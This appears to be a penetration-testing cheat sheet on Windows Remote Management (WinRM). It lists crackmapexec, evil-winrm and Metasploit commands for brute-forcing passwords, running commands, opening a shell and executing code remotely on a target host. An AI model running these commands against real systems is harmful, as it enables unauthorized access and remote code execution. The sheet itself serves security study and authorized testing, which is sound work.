# WinRM

Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to remotely access Windows systems.

- Remotely access and interact with Windows hosts on a local network.
- Remotely access and execute commands.
- Manage and configure Windows systems remotely.

It uses TCP port 5985 and 5986 (HTTPS).

## Exploiting WinRM with crackmapexec

```bash
# Identify the password for administrator user
crackmapexec winrm TARGET_IP -u administrator -p PASS_LIST

# Run commands
crackmapexec winrm TARGET_IP -u administrator -p IDENTIFIED_PASS -x "whoami"
```

## Get a command shel with evil-winrm.rb
```bash
evil-winrm.rb -u TARGET_USER -p 'TARGET_PASS' -i TARGET_IP
```

## Exploiting WinRM with Metasploit

```bash
workspace -a WORKSPACE_NAME

db_nmap -sS -sV -O -p- TARGET_IP

# Search for winrm auxiliary modules
search type:auxiliary winrm

use auxiliary/scanner/winrm/winrm_auth_methods
```

**auxiliary/scanner/winrm/winrm_login**

Login brute-force

```bash
use auxiliary/scanner/winrm/winrm_login

set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt

set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```


**auxiliary/scanner/winrm/winrm_cmd**

```bash
use auxiliary/scanner/winrm/winrm_cmd

set USERNAME USER_NAME

set PASSWORD PASS_VALUE

set CMD whoami
```

**exploit/windows/winrm/winrm_script_exec**

RCE, credentials are needed to execute this module.

```bash
use exploit/windows/winrm/winrm_script_exec

set USERNAME USER_NAME

set PASSWORD PASS_VALUE

set FORCE_VBS true

exploit
```